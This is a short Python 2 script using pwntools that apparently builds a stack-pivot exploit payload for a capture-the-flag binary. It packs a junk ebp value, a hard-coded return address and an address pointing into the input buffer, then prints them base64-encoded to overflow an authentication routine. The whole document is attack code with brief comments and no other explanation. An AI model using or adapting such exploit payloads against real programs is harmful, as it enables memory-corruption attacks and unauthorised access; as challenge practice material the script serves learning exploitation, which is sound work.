#!/usr/bin/python2

from pwn import *

junk  = p32(0xdeadbeef) # This will get popped into ebp (when leaving auth)
ret   = p32(0x08049278) # This will be the ret address of main
input = p32(0x0811eb40) # This will be the ebp of main (address of input)

print b64e(junk + ret + input)
